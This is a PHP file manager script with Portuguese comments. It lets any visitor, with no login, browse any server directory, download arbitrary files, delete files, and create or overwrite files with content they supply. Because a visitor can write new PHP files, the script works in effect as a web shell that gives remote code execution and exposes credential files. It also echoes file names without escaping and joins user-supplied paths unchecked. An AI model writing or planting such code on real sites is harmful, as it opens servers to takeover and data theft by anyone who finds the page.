<?php
// Verificar se há solicitação de download
if (isset($_GET['download'])) {
    $file = realpath($_GET['dir']) . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit; // Finaliza o script após o download
    } else {
        die('Arquivo não encontrado.');
    }
}

// Caminho atual
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$path = realpath($dir);

if (!$path || !is_dir($path)) die("Caminho inválido.");

// Deletar arquivo
if (isset($_GET['delete'])) {
    $file = "$path/" . $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
        header("Location: ?dir=$path");
        exit;
    } else {
        die("Erro: Arquivo não encontrado.");
    }
}

// Criar arquivo
if (isset($_POST['newfile'])) {
    $file = "$path/" . $_POST['newfile'];
    file_put_contents($file, $_POST['content'] ?? '');
    header("Location: ?dir=$path");
    exit;
}

// Salvar edição de arquivo
if (isset($_POST['editfile'])) {
    $file = "$path/" . $_POST['editfile'];
    file_put_contents($file, $_POST['content']);
    header("Location: ?dir=$path");
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerenciador de Arquivos</title>
</head>
<body>
    <h2>Listagem de Arquivos - <?php echo htmlspecialchars($path); ?></h2>
    <ul>
        <?php
        foreach (scandir($path) as $item) {
            $itemPath = "$path/$item";
            if ($item === '.') continue;
            echo '<li>';
            if (is_dir($itemPath)) {
                echo "<a href='?dir=" . urlencode($itemPath) . "'>$item/</a>";
            } else {
                echo "<a href='?dir=" . urlencode($path) . "&edit=" . urlencode($item) . "'>$item</a>";
                echo " <form method='GET' style='display:inline;'>";
                echo "<input type='hidden' name='dir' value='" . htmlspecialchars($path) . "'>";
                echo "<input type='hidden' name='download' value='" . htmlspecialchars($item) . "'>";
                echo "<button type='submit' style='color:blue;'>Download</button>";
                echo "</form>";
                echo " <form method='GET' style='display:inline;' onsubmit=\"return confirm('Tem certeza que deseja apagar o arquivo $item?');\">";
                echo "<input type='hidden' name='dir' value='" . htmlspecialchars($path) . "'>";
                echo "<input type='hidden' name='delete' value='" . htmlspecialchars($item) . "'>";
                echo "<button type='submit' style='color:red;'>Apagar</button>";
                echo "</form>";
            }
            echo '</li>';
        }
        ?>
    </ul>

    <?php
    // Editar arquivo
    if (isset($_GET['edit'])) {
        $file = "$path/" . $_GET['edit'];
        if (file_exists($file)) {
            echo "<h3>Editando: " . htmlspecialchars($_GET['edit']) . "</h3>";
            echo "<form method='POST'>";
            echo "<textarea name='content' cols='80' rows='20'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>";
            echo "<input type='hidden' name='editfile' value='" . htmlspecialchars($_GET['edit']) . "'>";
            echo "<input type='submit' value='Salvar'>";
            echo "</form>";
        } else {
            echo "<p>Erro: Arquivo não encontrado.</p>";
        }
    }
    ?>

    <h3>Criar Novo Arquivo</h3>
    <form method="POST">
        <input name="newfile" placeholder="Nome do arquivo"><br>
        <textarea name="content" cols="80" rows="10"></textarea><br>
        <input type="submit" value="Criar">
    </form>
</body>
</html>
